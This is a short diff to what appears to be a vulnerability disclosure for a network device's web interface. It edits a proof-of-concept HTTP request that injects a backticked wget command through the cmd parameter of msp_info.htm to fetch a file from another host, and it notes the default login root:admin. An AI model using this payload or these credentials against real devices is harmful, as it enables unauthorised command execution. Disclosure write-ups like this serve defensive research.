@@ -43,7 +43,7 @@ After logging in with the default password root:admin, accessing the msp_info.ht
 poc
 
 ```
-GET /msp_info.htm?flag=cmd&cmd=`wget%20http://192.168.0.2:8000/aaa` HTTP/1.1
+GET /msp_info.htm?flag=cmd&cmd=`wget%20http://192.168.0.2:8000/test.txt` HTTP/1.1
 
 Host: 192.168.0.1
 
@@ -64,4 +64,4 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-![image](https://github.com/user-attachments/assets/d59ec088-a8c4-4b82-87ff-341633c8b03f)
+![image](https://github.com/user-attachments/assets/410e26ee-98e5-46da-8b11-f2eb6676342c)
